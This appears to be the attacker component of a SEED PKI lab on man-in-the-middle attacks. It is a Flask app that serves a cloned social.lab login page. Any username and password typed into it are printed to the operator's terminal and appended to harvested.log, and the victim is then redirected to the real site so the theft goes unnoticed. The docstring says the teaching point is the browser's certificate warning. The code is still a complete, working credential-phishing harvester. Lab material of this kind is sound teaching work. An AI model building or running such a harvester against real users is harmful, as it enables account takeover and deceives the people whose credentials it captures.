"""Attacker instance - a fake social.lab login page (credential harvester).

This is the "defeat the MITM" half of the SEED PKI lab. It serves a pixel
copy of the real Social Lab login page, but it is a different machine with a
self-signed certificate that does NOT chain to the lab Root CA.

The teaching point is the DEFENCE: once the operator spoofs DNS so social.lab
points here, a victim's browser still refuses to open the page quietly - it
shows a certificate warning, because this server cannot present a certificate
the lab CA signed. The harvester below only ever sees a password if the victim
ignores that warning and types one in anyway.

  GET  /login   serve the cloned login page (looks exactly like the real one)
  POST /login   print whatever was typed to the operator's terminal, then send
                the victim on to the REAL https://social.lab/login
"""

import os
import sys
from datetime import datetime, timezone
from pathlib import Path

from flask import (Flask, g, redirect, render_template, request)

BASE_DIR = Path(__file__).resolve().parent

# Where the real site lives - after "capturing", the victim is bounced here so
# the second (real, padlocked) login succeeds and nothing looks wrong.
REAL_SITE = os.environ.get("REAL_SITE", "https://social.lab/login")

# Every captured login is appended here; attack.sh tails it in the terminal.
HARVEST_LOG = BASE_DIR / "harvested.log"

app = Flask(__name__)
app.secret_key = "attacker-does-not-need-sessions"


def now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")


@app.before_request
def no_user():
    # The cloned base.html checks g.user; the fake page never logs anyone in.
    g.user = None


# The copied template calls url_for('feed'), url_for('signup') and
# url_for('logout'), so those endpoints have to exist. Each just bounces to
# the fake login page (they need distinct function names for url_for).
@app.route("/")
def index():
    return redirect("/login")


@app.route("/feed")
def feed():
    return redirect("/login")


@app.route("/signup")
def signup():
    return redirect("/login")


@app.route("/logout")
def logout():
    return redirect("/login")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        line = (f"[{now()}] CAPTURED social.lab login  "
                f"username={username!r}  password={password!r}  "
                f"victim={request.remote_addr}")

        # Show it in the operator's terminal and keep a copy on disk.
        print("\n" + "=" * 72, flush=True)
        print(line, flush=True)
        print("=" * 72, flush=True)
        with HARVEST_LOG.open("a") as fh:
            fh.write(line + "\n")

        # Hand the victim to the real site so their next try "just works".
        return redirect(REAL_SITE)

    return render_template("login.html")


if __name__ == "__main__":
    print(f"[attacker] credential harvester up - real site is {REAL_SITE}",
          file=sys.stderr, flush=True)
    app.run(host="127.0.0.1", port=8000)
